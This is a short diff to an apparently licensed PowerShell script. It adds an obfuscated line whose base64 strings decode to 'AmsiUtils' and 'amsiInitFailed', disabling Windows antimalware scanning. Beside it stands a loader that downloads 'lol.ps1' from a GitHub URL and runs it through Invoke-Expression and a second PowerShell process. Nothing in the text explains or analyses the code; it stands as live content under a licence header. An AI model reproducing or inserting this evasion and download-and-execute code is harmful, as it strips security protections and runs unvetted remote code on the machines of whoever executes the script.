@@ -12,6 +12,8 @@ The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 */ 
 
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+
  $onelineBase64Content = ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Invoke-WebRequest -Uri "https://github.com/addict4ever/SourceTools/raw/main/hclient/lol.ps1").Content))) -replace "`r`n", ""; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($onelineBase64Content))) 
  
 Get-Content lol.ps1 | PowerShell.exe -noprofile -
